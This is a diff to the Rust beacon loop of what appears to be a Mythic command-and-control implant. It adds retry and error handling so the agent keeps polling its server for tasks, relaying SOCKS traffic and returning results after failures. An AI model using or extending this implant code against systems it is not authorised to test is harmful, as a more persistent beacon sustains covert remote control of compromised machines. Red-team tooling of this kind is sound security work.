@@ -131,19 +131,32 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
     } // Checkin successful
 
     loop {
-        // Get new tasing from Mythic
-        let pending_tasks = agent.get_tasking()?;
+        // Get new tasking from Mythic with retry logic
+        let pending_tasks = match agent.get_tasking() {
+            Ok(tasks) => tasks,
+            Err(e) => {
+                eprintln!("Failed to get tasking: {}. Retrying...", e);
+                agent.sleep();
+                continue;
+            }
+        };
 
         // Process the pending tasks
-        agent
-            .tasking
-            .process_tasks(pending_tasks.as_ref(), &mut agent.shared)?;
+        if let Err(e) = agent.tasking.process_tasks(pending_tasks.as_ref(), &mut agent.shared) {
+            eprintln!("Failed to process tasks: {}. Continuing...", e);
+        }
 
         // Sleep the agent
         agent.sleep();
 
         // Get the completed task information
-        let completed_tasks = agent.tasking.get_completed_tasks()?;
+        let completed_tasks = match agent.tasking.get_completed_tasks() {
+            Ok(tasks) => tasks,
+            Err(e) => {
+                eprintln!("Failed to get completed tasks: {}. Continuing...", e);
+                continue;
+            }
+        };
 
         // Process SOCKS messages multiple times for better responsiveness
         for _ in 0..5 {
@@ -154,13 +167,20 @@ fn run_beacon() -> Result<(), Box<dyn Error>> {
             std::thread::sleep(std::time::Duration::from_millis(10));
         }
 
-        // Send the completed tasking information up to Mythic
-        let continued_tasking = agent.send_tasking(&completed_tasks)?;
+        // Send the completed tasking information up to Mythic with retry logic
+        let continued_tasking = match agent.send_tasking(&completed_tasks) {
+            Ok(tasking) => tasking,
+            Err(e) => {
+                eprintln!("Failed to send tasking: {}. Retrying...", e);
+                agent.sleep();
+                continue;
+            }
+        };
 
         // Pass along any continued tasking (download, upload, etc.)
-        agent
-            .tasking
-            .process_tasks(continued_tasking.as_ref(), &mut agent.shared)?;
+        if let Err(e) = agent.tasking.process_tasks(continued_tasking.as_ref(), &mut agent.shared) {
+            eprintln!("Failed to process continued tasking: {}. Continuing...", e);
+        }
 
         // Break out of the loop if the agent should exit
         if agent.shared.exit_agent {
